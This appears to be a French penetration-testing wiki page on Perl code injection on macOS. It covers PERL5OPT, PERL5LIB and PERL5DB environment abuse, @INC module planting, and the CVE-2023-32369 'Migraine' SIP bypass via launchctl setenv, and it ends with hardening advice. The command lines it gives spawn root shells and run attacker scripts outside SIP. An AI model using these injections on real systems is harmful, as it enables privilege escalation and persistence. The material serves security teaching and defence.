# Injection d'applications Perl sous macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via les variables d'environnement `PERL5OPT` et `PERL5LIB`

En utilisant la variable d'environnement **`PERL5OPT`**, il est possible de faire exécuter des commandes arbitraires à **Perl** au démarrage de l'interpréteur (même **avant** l'analyse de la première ligne du script cible).
Par exemple, créez ce script :
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Maintenant, **exportez la variable d'environnement** et exécutez le script **perl** :
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Une autre option consiste à créer un module Perl (par exemple `/tmp/pmod.pm`) :
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Puis utilisez les variables d’environnement afin que le module soit localisé et chargé automatiquement :
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Autres variables d'environnement intéressantes

* **`PERL5DB`** – lorsque l'interpréteur est démarré avec l'option **`-d`** (debugger), le contenu de `PERL5DB` est exécuté en tant que code Perl *dans* le contexte du debugger.
Si vous pouvez influencer à la fois l'environnement **et** les options de ligne de commande d'un processus Perl privilégié, vous pouvez faire quelque chose comme ceci :

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – sous Windows, cette variable contrôle l'exécutable shell que Perl utilisera lorsqu'il doit démarrer un shell. Elle est mentionnée ici uniquement pour être complet, car elle n'est pas pertinente sous macOS.

Bien que **`PERL5DB`** nécessite l'option `-d`, il est courant de trouver des scripts de maintenance ou d'installation exécutés en tant que *root* avec cette option activée pour un troubleshooting détaillé, ce qui fait de cette variable un vecteur d'escalade valide.

## Via les dépendances (@INC abuse)

Il est possible d'afficher le chemin d'inclusion que Perl recherchera (**`@INC`**) en exécutant :
```bash
perl -e 'print join("\n", @INC)'
```
La sortie typique sur macOS 13/14 ressemble à :
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Certains des dossiers retournés n’existent même pas, mais **`/Library/Perl/5.30`** existe, n’est *pas* protégé par SIP et se trouve *avant* les dossiers protégés par SIP. Par conséquent, si vous pouvez écrire en tant que *root*, vous pouvez déposer un module malveillant (par exemple `File/Basename.pm`) qui sera chargé *en priorité* par tout script privilégié important ce module.

> [!WARNING]
> Vous avez toujours besoin de **root** pour écrire dans `/Library/Perl`, et macOS affichera une invite **TCC** demandant un accès *Full Disk Access* au processus effectuant l’opération d’écriture.

Par exemple, si un script importe **`use File::Basename;`**, il serait possible de créer `/Library/Perl/5.30/File/Basename.pm` contenant du code contrôlé par l’attaquant.

## Contournement de SIP via Migration Assistant (CVE-2023-32369 « Migraine »)

En mai 2023, Microsoft a divulgué **CVE-2023-32369**, surnommée **Migraine**, une technique de post-exploitation qui permet à un attaquant *root* de **contourner complètement System Integrity Protection (SIP)**.  
Le composant vulnérable est **`systemmigrationd`**, un daemon doté de l’entitlement **`com.apple.rootless.install.heritable`**. Tout processus enfant lancé par ce daemon hérite de l’entitlement et s’exécute donc **en dehors des restrictions de SIP**.<sup>[[1]](#references)</sup>

Parmi les processus enfants identifiés par les chercheurs figure l’interpréteur signé par Apple :<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Comme Perl respecte `PERL5OPT` (et que Bash respecte `BASH_ENV`), l’empoisonnement de l’*environnement* du daemon suffit à obtenir une exécution arbitraire dans un contexte sans SIP :<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Lorsque `migrateLocalKDC` s’exécute, `/usr/bin/perl` démarre avec le `PERL5OPT` malveillant et exécute `/private/tmp/migraine.sh` *avant la réactivation de SIP*. Depuis ce script, vous pouvez, par exemple, copier une payload dans **`/System/Library/LaunchDaemons`** ou attribuer l’attribut étendu `com.apple.rootless` afin de rendre un fichier **non supprimable**.

Apple a corrigé le problème dans macOS **Ventura 13.4**, **Monterey 12.6.6** et **Big Sur 11.7.7**, mais les systèmes plus anciens ou non corrigés restent exploitables.<sup>[[1]](#references)</sup>

## Recommandations de hardening

1. **Effacer les variables dangereuses** – les launchdaemons privilégiés ou les cron jobs doivent démarrer avec un environnement vierge (`launchctl unsetenv PERL5OPT`, `env -i`, etc.).
2. **Éviter d’exécuter des interpreters en tant que root** sauf en cas de nécessité absolue. Utiliser des binaires compilés ou abandonner rapidement les privilèges.
3. **Fournir les scripts avec `-T` (taint mode)** afin que Perl ignore `PERL5OPT` et les autres switches dangereux lorsque le taint checking est activé.
4. **Maintenir macOS à jour** – “Migraine” est entièrement corrigé dans les versions actuelles.

## Références

- [1] [Microsoft Security Blog – Une nouvelle vulnérabilité macOS, Migraine, pourrait contourner System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
